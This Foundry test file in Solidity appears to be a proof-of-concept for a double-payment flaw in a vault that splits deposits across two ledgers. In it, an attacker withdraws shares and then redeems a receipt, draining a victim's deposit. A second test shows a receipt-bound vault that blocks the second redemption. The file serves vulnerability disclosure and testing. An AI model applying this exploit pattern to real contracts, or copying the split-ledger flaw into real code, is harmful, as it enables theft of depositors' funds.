// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ReceiptSplitVault, ReceiptBoundVault, MockAsset} from "../src/ReceiptSplitVault.sol";

/// Directed PoC: 100 in, 200 out. This is the sample a founder runs in 30 seconds.
contract AttackSuite is Test {
    MockAsset internal asset;
    ReceiptSplitVault internal vault;
    address internal attacker = address(0xA11CE);
    address internal victim = address(0xBEEF);

    function setUp() public {
        asset = new MockAsset();
        vault = new ReceiptSplitVault(asset);
        asset.mint(attacker, 100 ether);
        asset.mint(victim, 100 ether);
        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(100 ether);
        vm.stopPrank();
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(100 ether);
        vm.stopPrank();
    }

    function test_double_pay_via_split_ledgers() public {
        // Attacker burns ledger A then ledger B. Victim's 100 is the second payment.
        vm.startPrank(attacker);
        vault.withdrawShares(100 ether);
        vault.redeemReceipt(1);
        vm.stopPrank();

        assertEq(asset.balanceOf(attacker), 200 ether, "attacker deposited 100 and extracted 200");
        assertEq(asset.balanceOf(address(vault)), 0, "victim residue stolen");
        assertEq(vault.shares(victim), 100 ether, "victim share still recorded, backing gone");
    }

    function test_bound_vault_blocks_double_pay() public {
        ReceiptBoundVault bound = new ReceiptBoundVault(asset);
        vm.startPrank(attacker);
        asset.mint(attacker, 100 ether);
        asset.approve(address(bound), type(uint256).max);
        uint256 id = bound.deposit(100 ether);
        bound.redeemReceipt(id);
        vm.expectRevert(bytes("SPENT"));
        bound.redeemReceipt(id);
        vm.stopPrank();
        assertEq(asset.balanceOf(address(bound)), 0);
        assertEq(bound.shares(attacker), 0);
    }
}
